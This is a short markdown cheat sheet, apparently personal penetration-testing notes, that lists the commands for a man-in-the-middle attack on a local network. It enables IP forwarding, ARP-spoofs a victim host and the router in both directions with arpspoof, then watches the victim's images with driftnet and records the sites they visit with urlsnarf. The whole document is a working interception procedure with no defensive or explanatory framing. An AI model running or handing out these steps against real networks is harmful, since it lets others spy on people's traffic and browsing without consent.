# Man in the Middle

- Allow packet forwarding
```
sysctl net.ipv4.ip_forward=1
```

- Set up arpspoof between victim and router
```
arpspoof -i eth0 -t 192.168.0.90 192.168.0.1
```

- Set up arpspoof to capture all packet from router to victim.
```
arpspoof -i eth0 -t 192.168.0.1 192.168.0.90
```

- Monitor victim image traffic
```
driftnet -i eth0
```

- Capture website information 
```
urlsnarf -i eth0
```